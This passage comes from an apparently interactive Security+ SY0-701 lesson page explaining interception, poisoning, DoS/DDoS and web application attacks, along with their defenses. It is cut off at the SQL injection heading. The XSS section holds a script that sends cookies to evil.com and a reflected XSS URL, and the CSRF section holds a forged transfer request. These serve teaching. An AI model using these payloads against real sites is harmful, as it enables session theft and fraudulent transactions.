        <h4>&#128737; Objective 4: Hijacking &amp; Overflow</h4>
        <p>Explain session hijacking, URL/domain/clickjacking, buffer overflow, integer overflow, and privilege escalation.</p>
      </div>
    </div>

    <h3>Why This Matters</h3>
    <p>According to the 2024 Verizon Data Breach Investigations Report, web application attacks remain the #1 attack vector in confirmed data breaches. OWASP's 2021 Top 10—which continues to guide the industry—places injection attacks and insecure design at the top. Meanwhile, volumetric DDoS attacks reached record levels in 2024, with multi-terabit attacks disrupting critical infrastructure worldwide. Security professionals must understand these attack patterns to detect, prevent, and respond to them effectively.</p>

    <div class="highlight-card">
      <span class="card-label">Exam Tip</span>
      <p>The SY0-701 exam tests scenario-based application of attack knowledge. You must be able to <strong>identify attack indicators</strong> from descriptions, distinguish similar attacks (e.g., XSS vs. XSRF, DoS vs. DDoS), and recommend appropriate countermeasures. Expect questions that pair an attack description with the correct technical term or defensive control.</p>
    </div>

    <div style="text-align:center; margin-top:24px;">
      <button class="btn btn-danger" onclick="goToSection(1)" aria-label="Start lesson at section 1">
        &#9654; Begin Lesson
      </button>
    </div>
  </div>
</section>

<!-- ============================================================ -->
<!-- SECTION 1: INTERCEPTION ATTACKS -->
<!-- ============================================================ -->
<section class="lesson-section" id="section-1" aria-label="Interception Attacks">
  <div class="section-header">
    <h2>Interception Attacks</h2>
    <span class="obj-tag">MITM &bull; On-Path &bull; Replay &bull; MITB</span>
  </div>
  <div class="section-body">

    <h3>What Are Interception Attacks?</h3>
    <p>Interception attacks involve a threat actor inserting themselves into a communication path between two parties—without either party's knowledge. The attacker may silently observe, record, or actively modify the data in transit. The Security+ SY0-701 exam uses the updated term <strong>on-path attack</strong> (previously man-in-the-middle) to reflect attacker positioning on the network path.</p>

    <div class="sub-tabs" role="tablist" aria-label="Interception attack types">
      <button class="sub-tab-btn active" role="tab" aria-selected="true" data-tab="mitm-tab">On-Path / MITM</button>
      <button class="sub-tab-btn" role="tab" aria-selected="false" data-tab="mitb-tab">Man-in-the-Browser</button>
      <button class="sub-tab-btn" role="tab" aria-selected="false" data-tab="replay-tab">Replay Attacks</button>
      <button class="sub-tab-btn" role="tab" aria-selected="false" data-tab="ssl-strip-tab">SSL Stripping</button>
    </div>

    <div class="sub-tab-content active" id="mitm-tab">
      <h4>On-Path Attack (Man-in-the-Middle)</h4>
      <p>In an on-path attack, the attacker intercepts traffic between a client and server, often using ARP spoofing or rogue access points to redirect traffic. The attacker can eavesdrop, inject content, or relay modified messages while both parties believe they are communicating directly with each other.</p>

      <!-- Attack Flow Diagram -->
      <div class="attack-flow" role="img" aria-label="On-path attack flow diagram">
        <h4>&#9888; On-Path Attack Flow — Click each step to learn more</h4>
        <div class="flow-steps">
          <div class="flow-step">
            <button class="flow-node victim" onclick="showFlowDetail('mitm',0)" aria-label="Client step details" aria-expanded="false">&#128100;</button>
            <div class="flow-label">Client (Alice)</div>
          </div>
          <div class="flow-arrow" aria-hidden="true">&#8594;</div>
          <div class="flow-step">
            <button class="flow-node attacker" onclick="showFlowDetail('mitm',1)" aria-label="Attacker intercept step" aria-expanded="false">&#128373;</button>
            <div class="flow-label">Attacker Intercepts</div>
          </div>
          <div class="flow-arrow" aria-hidden="true">&#8594;</div>
          <div class="flow-step">
            <button class="flow-node victim" onclick="showFlowDetail('mitm',2)" aria-label="Server step details" aria-expanded="false">&#128290;</button>
            <div class="flow-label">Server (Bob)</div>
          </div>
          <div class="flow-arrow" aria-hidden="true">&#8592;</div>
          <div class="flow-step">
            <button class="flow-node attacker" onclick="showFlowDetail('mitm',3)" aria-label="Response modification step" aria-expanded="false">&#9998;</button>
            <div class="flow-label">Modify Response</div>
          </div>
          <div class="flow-arrow" aria-hidden="true">&#8592;</div>
          <div class="flow-step">
            <button class="flow-node victim" onclick="showFlowDetail('mitm',4)" aria-label="Client receives step" aria-expanded="false">&#128100;</button>
            <div class="flow-label">Client Receives<br>(unaware)</div>
          </div>
        </div>
        <div class="flow-detail" id="mitm-detail-0">Alice sends a request (e.g., HTTP GET or login form) believing she is communicating directly with Bob's server. Normally, traffic routes through the network path between them.</div>
        <div class="flow-detail" id="mitm-detail-1">The attacker has positioned themselves on the network path — through ARP cache poisoning, rogue Wi-Fi AP, BGP hijacking, or DNS spoofing — so Alice's traffic is routed through the attacker's system first.</div>
        <div class="flow-detail" id="mitm-detail-2">The attacker forwards the (possibly modified) request to the real server. The server responds normally, believing it is communicating with Alice directly. The attacker receives the server's response.</div>
        <div class="flow-detail" id="mitm-detail-3">The attacker may modify the server's response — injecting malicious scripts, changing account numbers, downgrading security settings, or simply logging credentials — before forwarding it to Alice.</div>
        <div class="flow-detail" id="mitm-detail-4">Alice receives the (potentially modified) response and has no indication that her communication was intercepted. The entire attack is transparent to both parties when executed successfully.</div>
      </div>

      <h4>Common MITM Enablers</h4>
      <div class="card-grid">
        <div class="info-card danger-card">
          <h4>ARP Spoofing</h4>
          <p>Attacker broadcasts fake ARP replies, associating their MAC address with a legitimate IP, poisoning nearby ARP caches to redirect traffic.</p>
        </div>
        <div class="info-card danger-card">
          <h4>Rogue Access Point</h4>
          <p>An attacker sets up an evil twin Wi-Fi network with the same SSID as a legitimate network, tricking users into connecting through the attacker's device.</p>
        </div>
        <div class="info-card danger-card">
          <h4>BGP Hijacking</h4>
          <p>Border Gateway Protocol route injection redirects internet traffic through attacker-controlled infrastructure at a large scale, affecting entire networks.</p>
        </div>
      </div>

      <div class="highlight-card">
        <span class="card-label">Countermeasures</span>
        <ul>
          <li><strong>HTTPS / TLS:</strong> Encrypts traffic so interception yields ciphertext only; certificate validation prevents spoofed servers</li>
          <li><strong>HSTS:</strong> HTTP Strict Transport Security prevents SSL stripping by enforcing HTTPS</li>
          <li><strong>Certificate Pinning:</strong> Applications verify server certificates match expected values</li>
          <li><strong>Dynamic ARP Inspection (DAI):</strong> Switches validate ARP packets against a DHCP snooping table</li>
          <li><strong>802.1X Port Authentication:</strong> Prevents unauthorized devices from connecting to the network</li>
        </ul>
      </div>
    </div>

    <div class="sub-tab-content" id="mitb-tab">
      <h4>Man-in-the-Browser (MITB)</h4>
      <p>A Man-in-the-Browser attack is closely related to MITM but operates <em>between the browser and the operating system</em>. A Trojan horse first infects the computer, then installs a malicious browser extension or hooks the browser's API to intercept and modify web transactions in real time — after decryption and before display.</p>

      <div class="danger-highlight">
        <span class="card-label">Why MITB is Especially Dangerous</span>
        <ul>
          <li>Attacks occur <em>after</em> TLS decryption, so HTTPS provides no protection</li>
          <li>Malicious code runs within the browser's trusted context</li>
          <li>Can modify transaction data (e.g., change banking transfer amount and destination) after the user has seen and confirmed it</li>
          <li>Two-factor authentication via one-time passwords can be bypassed by real-time relay</li>
          <li>Standard antivirus may not detect browser API hooking</li>
        </ul>
      </div>

      <h4>MITB Attack Lifecycle</h4>
      <div class="lifecycle-track" role="list" aria-label="MITB attack stages">
        <div class="lifecycle-step" role="listitem">
          <button class="lifecycle-circle" onclick="showLifecycleDetail('mitb',0)" aria-label="Stage 1: Infection">1</button>
          <div class="lifecycle-label">Trojan Infection</div>
        </div>
        <div class="lifecycle-arrow" aria-hidden="true">&#8594;</div>
        <div class="lifecycle-step" role="listitem">
          <button class="lifecycle-circle" onclick="showLifecycleDetail('mitb',1)" aria-label="Stage 2: Installation">2</button>
          <div class="lifecycle-label">Browser Hook Installed</div>
        </div>
        <div class="lifecycle-arrow" aria-hidden="true">&#8594;</div>
        <div class="lifecycle-step" role="listitem">
          <button class="lifecycle-circle" onclick="showLifecycleDetail('mitb',2)" aria-label="Stage 3: Dormancy">3</button>
          <div class="lifecycle-label">Wait for Target Site</div>
        </div>
        <div class="lifecycle-arrow" aria-hidden="true">&#8594;</div>
        <div class="lifecycle-step" role="listitem">
          <button class="lifecycle-circle" onclick="showLifecycleDetail('mitb',3)" aria-label="Stage 4: Interception">4</button>
          <div class="lifecycle-label">Intercept &amp; Modify</div>
        </div>
        <div class="lifecycle-arrow" aria-hidden="true">&#8594;</div>
        <div class="lifecycle-step" role="listitem">
          <button class="lifecycle-circle" onclick="showLifecycleDetail('mitb',4)" aria-label="Stage 5: Exfiltration">5</button>
          <div class="lifecycle-label">Exfiltrate Data</div>
        </div>
      </div>
      <div class="lifecycle-detail" id="mitb-0">A Trojan horse program (often delivered via phishing email, malicious download, or drive-by download) infects the victim's computer. The user typically has no visible indication of infection.</div>
      <div class="lifecycle-detail" id="mitb-1">The Trojan installs a malicious browser extension, BHO (Browser Helper Object), or hooks browser APIs (e.g., using DLL injection). This gives the malware full visibility into all browser activity.</div>
      <div class="lifecycle-detail" id="mitb-2">The malware lies dormant until the user visits a targeted site (e.g., a banking portal, payment processor, or corporate application). Target site lists are often remotely configurable.</div>
      <div class="lifecycle-detail" id="mitb-3">When the user submits a form on the targeted site, the malware intercepts the data before transmission, can modify values (e.g., changing a bank transfer destination account and amount), and may relay the original transaction to avoid detection.</div>
      <div class="lifecycle-detail" id="mitb-4">Captured credentials, session tokens, and modified transaction details are silently transmitted to attacker-controlled servers. The attack may not be detected until the victim notices unauthorized activity.</div>
    </div>

    <div class="sub-tab-content" id="replay-tab">
      <h4>Replay Attacks</h4>
      <p>In a replay attack, the attacker captures a valid data transmission (such as authentication credentials or a session token) and retransmits it later to authenticate as the legitimate user. The captured data may be encrypted — the attacker does not need to decrypt it, only to replay it.</p>

      <div class="resp-table-wrap">
        <table class="resp-table" aria-label="Replay attack scenarios">
          <thead>
            <tr>
              <th>Scenario</th>
              <th>What Is Captured</th>
              <th>How Used</th>
              <th>Countermeasure</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>Network Authentication Replay</td>
              <td>Authentication token or hash</td>
              <td>Replayed to gain unauthorized access</td>
              <td>Timestamps + nonces in authentication</td>
            </tr>
            <tr>
              <td>Pass-the-Hash (PtH)</td>
              <td>NTLM password hash from memory</td>
              <td>Used directly to authenticate without knowing the password</td>
              <td>Kerberos, Credential Guard, Protected Users</td>
            </tr>
            <tr>
              <td>Session Token Replay</td>
              <td>Session cookie from HTTP traffic</td>
              <td>Replayed to hijack authenticated session</td>
              <td>Short-lived tokens, Secure/HttpOnly cookies</td>
            </tr>
            <tr>
              <td>Wireless Frame Replay</td>
              <td>Encrypted 802.11 frames</td>
              <td>Retransmitted to forge packets or cause deauthentication</td>
              <td>WPA3, replay counters in 802.11i</td>
            </tr>
          </tbody>
        </table>
      </div>

      <div class="highlight-card">
        <span class="card-label">Key Defense: Nonces &amp; Timestamps</span>
        <p>Modern authentication protocols defeat replay attacks by including a <strong>nonce</strong> (number used once) or <strong>timestamp</strong> in each session. If the same message is replayed, the receiving system detects that the nonce has already been used or the timestamp has expired, and rejects the authentication.</p>
      </div>
    </div>

    <div class="sub-tab-content" id="ssl-strip-tab">
      <h4>SSL Stripping</h4>
      <p>SSL stripping is an MITM technique where the attacker downgrades a victim's HTTPS connection to HTTP. The attacker sits between the client and server, maintaining an HTTPS connection with the server while presenting only HTTP to the client. The user sees an unencrypted connection but may not notice the missing padlock.</p>

      <div class="compare-columns">
        <div class="compare-col attack-col">
          <h4>&#128421; How SSL Stripping Works</h4>
          <ol>
            <li>Attacker positions themselves on-path (e.g., rogue AP)</li>
            <li>Victim requests <code>http://bank.com</code></li>
            <li>Attacker fetches <code>https://bank.com</code> on victim's behalf</li>
            <li>Attacker serves the response back to victim over HTTP</li>
            <li>Victim sees unencrypted page; attacker sees all data in plaintext</li>
          </ol>
        </div>
        <div class="compare-col defense-col">
          <h4>&#9989; HSTS Defense</h4>
          <p><strong>HTTP Strict Transport Security (HSTS)</strong> instructs browsers to only connect via HTTPS for a specified period. The <code>Strict-Transport-Security</code> response header causes browsers to reject any HTTP connection to the site, defeating SSL stripping.</p>
          <p><strong>HSTS Preloading:</strong> Browsers ship with a built-in list of HSTS domains, meaning the HTTPS-only policy applies even on the very first visit — before any header is received.</p>
        </div>
      </div>
    </div>

    <div style="margin-top:24px; text-align:right;">
      <button class="btn btn-primary" onclick="goToSection(2)">Next: Poisoning Attacks &#8594;</button>
    </div>
  </div>
</section>

<!-- ============================================================ -->
<!-- SECTION 2: POISONING ATTACKS -->
<!-- ============================================================ -->
<section class="lesson-section" id="section-2" aria-label="Poisoning Attacks">
  <div class="section-header">
    <h2>Poisoning Attacks</h2>
    <span class="obj-tag">ARP Poisoning &bull; DNS Poisoning &bull; Privilege Escalation</span>
  </div>
  <div class="section-body">

    <h3>How Poisoning Attacks Work</h3>
    <p>Poisoning attacks inject false or malicious data into legitimate network processes. Rather than blocking communication, the attacker corrupts the underlying data stores that network protocols rely on — causing legitimate systems to redirect traffic or grant unauthorized access without realizing the data has been compromised.</p>

    <!-- ARP Poisoning -->
    <h3>ARP Poisoning (ARP Spoofing)</h3>
    <p>The Address Resolution Protocol (ARP) maps IP addresses to MAC addresses on a local network. ARP is <em>stateless</em> — devices accept and cache ARP replies even if they did not make a request. Attackers exploit this by broadcasting fake ARP replies, associating their MAC address with the IP address of a legitimate host (e.g., the default gateway), causing all traffic destined for that IP to flow through the attacker instead.</p>

    <div class="diagram-wrap" role="img" aria-label="ARP poisoning process">
      <h4>&#9888; ARP Poisoning Process — Click each phase</h4>
      <div style="display:flex; flex-direction:column; gap:12px;">
        <div style="display:flex; gap:12px; flex-wrap:wrap; align-items:stretch;">
          <button onclick="showArpPhase(0)" style="flex:1; min-width:140px; background:rgba(0,102,102,.4); border:2px solid var(--gold); color:white; padding:14px; border-radius:8px; cursor:pointer; font-family:var(--font-body); font-weight:700; transition:.3s;">
            1. Normal ARP
          </button>
          <button onclick="showArpPhase(1)" style="flex:1; min-width:140px; background:rgba(204,0,0,.4); border:2px solid var(--gold); color:white; padding:14px; border-radius:8px; cursor:pointer; font-family:var(--font-body); font-weight:700; transition:.3s;">
            2. ARP Poisoning
          </button>
          <button onclick="showArpPhase(2)" style="flex:1; min-width:140px; background:rgba(204,0,0,.4); border:2px solid var(--gold); color:white; padding:14px; border-radius:8px; cursor:pointer; font-family:var(--font-body); font-weight:700; transition:.3s;">
            3. Traffic Redirect
          </button>
          <button onclick="showArpPhase(3)" style="flex:1; min-width:140px; background:rgba(102,0,0,.5); border:2px solid var(--gold); color:white; padding:14px; border-radius:8px; cursor:pointer; font-family:var(--font-body); font-weight:700; transition:.3s;">
            4. MITM Established
          </button>
        </div>
        <div class="flow-detail" id="arp-phase-detail" style="display:none; background:rgba(255,255,255,.1); border:1px solid var(--gold); border-radius:8px; padding:16px; font-size:.9rem;">
          Click a phase above to learn about that stage of ARP poisoning.
        </div>
      </div>
    </div>

    <div class="highlight-card">
      <span class="card-label">ARP Poisoning Defenses</span>
      <ul>
        <li><strong>Dynamic ARP Inspection (DAI):</strong> Switch feature that validates ARP packets against the DHCP snooping binding table; drops packets with mismatched MAC-to-IP mappings</li>
        <li><strong>Static ARP entries:</strong> Manually configure ARP entries for critical systems (impractical at scale)</li>
        <li><strong>Port security:</strong> Limits number of MAC addresses per switch port</li>
        <li><strong>Encrypted protocols:</strong> Even if traffic is redirected, TLS/IPsec encryption prevents data from being read</li>
        <li><strong>XDR/NDR tools:</strong> Detect anomalous ARP traffic patterns and gratuitous ARP broadcasts</li>
      </ul>
    </div>

    <!-- DNS Poisoning -->
    <h3>DNS Poisoning (DNS Cache Poisoning / Spoofing)</h3>
    <p>The Domain Name System (DNS) translates human-readable hostnames into IP addresses. DNS poisoning injects false DNS records into a resolver's cache, causing clients that query that resolver to receive malicious IP addresses and connect to attacker-controlled servers instead of legitimate ones.</p>

    <div class="resp-table-wrap">
      <table class="resp-table" aria-label="DNS poisoning attack vectors">
        <thead>
          <tr>
            <th>Attack Vector</th>
            <th>Method</th>
            <th>Impact</th>
            <th>Countermeasure</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Cache Poisoning (Kaminsky Attack)</td>
            <td>Flood resolver with forged responses; predict transaction ID</td>
            <td>Resolver caches malicious IP for entire domain</td>
            <td>DNSSEC, source port randomization</td>
          </tr>
          <tr>
            <td>Local Hosts File Modification</td>
            <td>Malware edits <code>/etc/hosts</code> or Windows hosts file</td>
            <td>Redirects specific domains on a single device</td>
            <td>File integrity monitoring, endpoint protection</td>
          </tr>
          <tr>
            <td>Rogue DNS Server</td>
            <td>Configure victim device to use attacker's DNS server</td>
            <td>All DNS resolution under attacker control</td>
            <td>DHCP snooping, 802.1X, DNS-over-HTTPS (DoH)</td>
          </tr>
          <tr>
            <td>DNS Amplification (also a DDoS)</td>
            <td>Use open resolvers to amplify small queries into large flood</td>
            <td>DDoS victim with DNS response traffic</td>
            <td>Disable open resolvers, rate-limit DNS responses</td>
          </tr>
        </tbody>
      </table>
    </div>

    <div class="compare-columns">
      <div class="compare-col attack-col">
        <h4>&#128165; DNSSEC — How It Works</h4>
        <p><strong>DNS Security Extensions (DNSSEC)</strong> adds cryptographic signatures to DNS records. Each zone signs its resource records with a private key; resolvers verify these signatures using the zone's public key. Forged DNS responses without valid signatures are rejected, preventing cache poisoning.</p>
        <p>DNSSEC does <em>not</em> encrypt DNS traffic — it only provides authentication and integrity. DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) add privacy by encrypting the DNS query itself.</p>
      </div>
      <div class="compare-col defense-col">
        <h4>&#9989; Modern DNS Defenses</h4>
        <ul>
          <li><strong>DNSSEC:</strong> Cryptographic signature validation</li>
          <li><strong>DNS-over-HTTPS (DoH):</strong> Encrypts DNS queries via HTTPS</li>
          <li><strong>DNS-over-TLS (DoT):</strong> Encrypts DNS queries via TLS on port 853</li>
          <li><strong>RPZ (Response Policy Zones):</strong> Block known malicious domains</li>
          <li><strong>Split-horizon DNS:</strong> Different responses for internal vs. external queries</li>
        </ul>
      </div>
    </div>

    <!-- Privilege Escalation -->
    <h3>Privilege Escalation</h3>
    <p>Privilege escalation occurs when an attacker exploits a software vulnerability, misconfiguration, or design flaw to gain access to resources or capabilities beyond those normally granted to them. It is often the step between initial compromise and full control of a system.</p>

    <div class="card-grid">
      <div class="info-card danger-card">
        <h4>Vertical Privilege Escalation</h4>
        <p>A lower-privileged user gains capabilities reserved for higher-privileged users — e.g., a standard user obtaining root/Administrator access. Exploits OS kernel vulnerabilities, SUID binaries, or misconfigured sudo rules.</p>
        <span class="severity sev-critical">Critical</span>
      </div>
      <div class="info-card warning-card">
        <h4>Horizontal Privilege Escalation</h4>
        <p>A user accesses resources or data of another user at the same privilege level — e.g., viewing another user's bank account by manipulating a URL parameter. Also called an Insecure Direct Object Reference (IDOR).</p>
        <span class="severity sev-high">High</span>
      </div>
      <div class="info-card">
        <h4>Common Escalation Vectors</h4>
        <ul style="font-size:.85rem; margin-top:6px; padding-left:16px;">
          <li>Kernel exploits (e.g., Dirty COW)</li>
          <li>Weak file permissions / SUID misuse</li>
          <li>Unquoted service paths (Windows)</li>
          <li>DLL hijacking</li>
          <li>Token impersonation (Windows)</li>
          <li>Sudo misconfiguration (Linux)</li>
        </ul>
      </div>
    </div>

    <div style="margin-top:24px; text-align:right;">
      <button class="btn btn-primary" onclick="goToSection(3)">Next: Denial of Service &#8594;</button>
    </div>
  </div>
</section>

<!-- ============================================================ -->
<!-- SECTION 3: DENIAL OF SERVICE -->
<!-- ============================================================ -->
<section class="lesson-section" id="section-3" aria-label="Denial of Service Attacks">
  <div class="section-header">
    <h2>Denial of Service (DoS) &amp; DDoS Attacks</h2>
    <span class="obj-tag">DoS &bull; DDoS &bull; SYN Flood &bull; Amplification &bull; Botnets</span>
  </div>
  <div class="section-body">

    <h3>What Is Denial of Service?</h3>
    <p>A Denial of Service (DoS) attack attempts to make a system, network, or service unavailable to its intended users by overwhelming it with requests, consuming its resources, or exploiting a vulnerability that causes it to crash. Modern DoS attacks are almost always <strong>Distributed DoS (DDoS)</strong> — coordinated from hundreds or thousands of compromised devices (a botnet) simultaneously.</p>

    <div class="card-grid">
      <div class="info-card danger-card">
        <h4>&#128165; Volumetric Attacks</h4>
        <p>Overwhelm bandwidth with massive traffic floods. Measured in Gbps/Tbps. Include UDP floods, ICMP floods, and amplification attacks.</p>
        <span class="severity sev-critical">Critical</span>
      </div>
      <div class="info-card danger-card">
        <h4>&#128296; Protocol Attacks</h4>
        <p>Exhaust connection state tables or firewall resources. Include SYN floods, Smurf attacks, and Ping of Death. Measured in PPS (packets per second).</p>
        <span class="severity sev-high">High</span>
      </div>
      <div class="info-card warning-card">
        <h4>&#128187; Application-Layer Attacks</h4>
        <p>Target specific application functions with seemingly legitimate requests. HTTP floods, Slowloris, and RUDY attacks operate at Layer 7. Difficult to distinguish from legitimate traffic.</p>
        <span class="severity sev-high">High</span>
      </div>
    </div>

    <h3>SYN Flood Attack</h3>
    <p>The SYN flood exploits the TCP three-way handshake. An attacker sends a large number of TCP SYN packets with spoofed source IP addresses. The server responds with SYN-ACK packets and waits for the final ACK — which never arrives (because the source IPs are spoofed). Each half-open connection consumes server resources until the connection table fills up and the server can no longer accept legitimate connections.</p>

    <div class="attack-flow" role="img" aria-label="SYN flood attack diagram">
      <h4>&#9888; TCP Three-Way Handshake vs. SYN Flood</h4>
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px; flex-wrap:wrap;">
        <div>
          <p style="color:var(--gold); font-weight:700; margin-bottom:10px;">&#9989; Normal Handshake</p>
          <div style="font-family:var(--font-mono); font-size:.82rem; line-height:2;">
            Client &#8594; Server: <span style="color:#66ff66;">SYN</span><br>
            Server &#8594; Client: <span style="color:#66ff66;">SYN-ACK</span><br>
            Client &#8594; Server: <span style="color:#66ff66;">ACK</span><br>
            <span style="color:#aaa;">&#9745; Connection Established</span>
          </div>
        </div>
        <div>
          <p style="color:var(--danger-light); font-weight:700; margin-bottom:10px;">&#9888; SYN Flood Attack</p>
          <div style="font-family:var(--font-mono); font-size:.82rem; line-height:2;">
            Attacker &#8594; Server: <span style="color:#ff6666;">SYN (spoofed IPs)</span><br>
            Server &#8594; Ghost IPs: <span style="color:#ffaa44;">SYN-ACK (no response)</span><br>
            <span style="color:#ff6666;">ACK never arrives...</span><br>
            <span style="color:#ff4444;">&#9746; Connection table full — GAME OVER</span>
          </div>
        </div>
      </div>
    </div>

    <div class="highlight-card">
      <span class="card-label">SYN Flood Defenses</span>
      <ul>
        <li><strong>SYN Cookies:</strong> Server generates a cryptographic SYN cookie instead of allocating state; only allocates resources when valid ACK is received</li>
        <li><strong>Rate Limiting:</strong> Limit SYN packets per source IP per second</li>
        <li><strong>Firewall Stateful Inspection:</strong> Drop half-open connections after a timeout threshold</li>
        <li><strong>Anycast Network Diffusion:</strong> Distribute traffic across multiple global nodes to absorb volumetric attacks</li>
      </ul>
    </div>

    <!-- DNS Amplification -->
    <h3>DNS Amplification Attack</h3>
    <p>DNS amplification is a volumetric DDoS attack that exploits open DNS resolvers. The attacker sends small DNS queries (typically for large record types like ANY or TXT) with the victim's IP address as the spoofed source. The DNS servers send large responses to the victim, amplifying the attack traffic by a factor of 50–70x. A 100 Mbps attack input can generate a multi-Gbps flood against the victim.</p>

    <div class="resp-table-wrap">
      <table class="resp-table" aria-label="Common DDoS amplification methods">
        <thead>
          <tr>
            <th>Amplification Method</th>
            <th>Protocol</th>
            <th>Amplification Factor</th>
            <th>Countermeasure</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>DNS Amplification</td>
            <td>UDP/53</td>
            <td>28–54x</td>
            <td>BCP38, disable open recursion, response rate limiting</td>
          </tr>
          <tr>
            <td>NTP Amplification (monlist)</td>
            <td>UDP/123</td>
            <td>Up to 556x</td>
            <td>Disable monlist, NTP authentication</td>
          </tr>
          <tr>
            <td>Memcached Amplification</td>
            <td>UDP/11211</td>
            <td>Up to 51,000x</td>
            <td>Never expose Memcached to internet; use TCP</td>
          </tr>
          <tr>
            <td>Smurf Attack (ICMP)</td>
            <td>ICMP</td>
            <td>Varies by subnet size</td>
            <td>Block directed broadcasts, ingress filtering</td>
          </tr>
        </tbody>
      </table>
    </div>

    <h3>Botnets &amp; Command and Control (C2)</h3>
    <p>Modern DDoS attacks are typically executed through botnets — networks of compromised "zombie" devices controlled remotely by an attacker via a Command and Control (C2) infrastructure. Botnets can include compromised PCs, IoT devices, routers, and web servers. The Mirai botnet (2016) demonstrated how millions of unsecured IoT devices could be weaponized to generate record-breaking DDoS attacks.</p>

    <div class="danger-highlight">
      <span class="card-label">DDoS Attack Scale (2024)</span>
      <p>In 2024, Cloudflare mitigated the largest DDoS attack ever recorded — a 5.6 Tbps UDP flood targeting a Mirai-variant botnet with 13,000+ IoT devices. The attack lasted only 80 seconds but represents the scale of modern threats. Organizations should plan for DDoS mitigation through cloud-based scrubbing services, anycast routing, and ISP-level black-hole routing agreements.</p>
    </div>

    <div style="margin-top:24px; text-align:right;">
      <button class="btn btn-primary" onclick="goToSection(4)">Next: Web Application Attacks &#8594;</button>
    </div>
  </div>
</section>

<!-- ============================================================ -->
<!-- SECTION 4: WEB APPLICATION ATTACKS -->
<!-- ============================================================ -->
<section class="lesson-section" id="section-4" aria-label="Web Application Attacks">
  <div class="section-header">
    <h2>Web Application Attacks</h2>
    <span class="obj-tag">XSS &bull; XSRF &bull; SQL Injection &bull; Command Injection &bull; OWASP Top 10</span>
  </div>
  <div class="section-body">

    <h3>Why Web Applications Are Targeted</h3>
    <p>Web applications present an enormous attack surface because they must accept user input, process it, and return dynamic responses — all across a protocol (HTTP/HTTPS) that many network security devices historically ignored. The OWASP Top 10 continues to identify injection attacks and access control failures as the most prevalent web application security risks.</p>

    <div class="danger-highlight">
      <span class="card-label">The Core Problem</span>
      <p>Most web application attacks succeed because of a single fundamental failure: <strong>trusting user input</strong>. Applications that accept data from users (form fields, URL parameters, HTTP headers, cookies) and process it without proper validation, sanitization, or encoding are vulnerable to a wide range of attacks.</p>
    </div>

    <!-- XSS -->
    <h3>Cross-Site Scripting (XSS)</h3>
    <p>In an XSS attack, the attacker injects malicious client-side scripts (typically JavaScript) into web pages that are then viewed by other users. The injected script executes in the victim's browser with the same trust as the legitimate website, allowing the attacker to steal session cookies, redirect users, keylog input, or perform actions on behalf of the victim.</p>

    <div class="sub-tabs" role="tablist" aria-label="XSS attack types">
      <button class="sub-tab-btn active" role="tab" aria-selected="true" data-tab="xss-stored">Stored XSS</button>
      <button class="sub-tab-btn" role="tab" aria-selected="false" data-tab="xss-reflected">Reflected XSS</button>
      <button class="sub-tab-btn" role="tab" aria-selected="false" data-tab="xss-dom">DOM-Based XSS</button>
    </div>

    <div class="sub-tab-content active" id="xss-stored">
      <h4>Stored (Persistent) XSS</h4>
      <p>The malicious script is permanently stored on the target server (e.g., in a database, comment field, or profile). Every user who visits the affected page receives and executes the malicious script in their browser. This is the most dangerous form of XSS because it affects all visitors without requiring them to click a specific link.</p>
      <p><strong>Example:</strong> An attacker posts a comment on a blog: <code style="background:#f0f0f0; padding:2px 6px; border-radius:4px;">&lt;script&gt;document.location='https://evil.com/?cookie='+document.cookie&lt;/script&gt;</code>. When any user views that comment, their session cookie is sent to the attacker.</p>
    </div>
    <div class="sub-tab-content" id="xss-reflected">
      <h4>Reflected (Non-Persistent) XSS</h4>
      <p>The malicious script is embedded in a URL and only executes when a victim clicks the crafted link. The script is "reflected" off the web server back to the victim's browser. Commonly delivered via phishing emails. Does not persist on the server — each attack requires the victim to visit the crafted URL.</p>
      <p><strong>Example:</strong> <code style="background:#f0f0f0; padding:2px 6px; border-radius:4px; font-size:.8rem;">https://store.com/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
    </div>
    <div class="sub-tab-content" id="xss-dom">
      <h4>DOM-Based XSS</h4>
      <p>The attack occurs entirely in the browser — the payload is never sent to the server. Instead, client-side JavaScript reads attacker-controlled data from the URL fragment or other sources and writes it to the DOM without sanitization. Server-side defenses cannot detect DOM-based XSS because the malicious payload never reaches the server.</p>
    </div>

    <div class="highlight-card">
      <span class="card-label">XSS Countermeasures</span>
      <ul>
        <li><strong>Output Encoding:</strong> Encode all user-controlled data before rendering in HTML, JavaScript, CSS, or URLs</li>
        <li><strong>Content Security Policy (CSP):</strong> HTTP header that restricts which scripts the browser will execute</li>
        <li><strong>HttpOnly cookies:</strong> Prevents JavaScript from accessing session cookies</li>
        <li><strong>Input Validation:</strong> Allowlist validation of all user input server-side</li>
        <li><strong>WAF (Web Application Firewall):</strong> Detect and block common XSS payloads at the perimeter</li>
      </ul>
    </div>

    <!-- XSRF -->
    <h3>Cross-Site Request Forgery (CSRF / XSRF)</h3>
    <p>CSRF tricks a victim's browser into making an unintended request to a web application where the victim is authenticated. The attack leverages the browser's automatic inclusion of cookies and session credentials with every request. Unlike XSS (which attacks the user via the site), CSRF attacks the site via the user's authenticated session.</p>

    <div class="compare-columns">
      <div class="compare-col attack-col">
        <h4>CSRF Attack Scenario</h4>
        <ol style="font-size:.88rem;">
          <li>Victim is logged into their bank (session cookie active)</li>
          <li>Victim visits attacker's malicious site (or email with hidden image)</li>
          <li>Attacker's page contains: <code style="font-size:.78rem;">&lt;img src="https://bank.com/transfer?to=attacker&amount=5000"&gt;</code></li>
          <li>Victim's browser fetches the image URL, sending the bank's session cookie</li>
          <li>Bank processes the transfer as legitimate (cookie appears valid)</li>
        </ol>
      </div>
      <div class="compare-col defense-col">
        <h4>CSRF Defenses</h4>
        <ul style="font-size:.88rem;">
          <li><strong>CSRF Tokens:</strong> Unique, secret, per-session token in each form; validated server-side</li>
          <li><strong>SameSite Cookie Attribute:</strong> Prevents cookies from being sent in cross-site requests (<code>SameSite=Strict</code> or <code>Lax</code>)</li>
          <li><strong>Referer/Origin Header Validation:</strong> Reject requests from unexpected origins</li>
          <li><strong>Re-authentication for sensitive actions:</strong> Require password confirmation for high-risk operations</li>
        </ul>
      </div>
    </div>

    <!-- SQL Injection -->
    <h3>SQL Injection</h3>
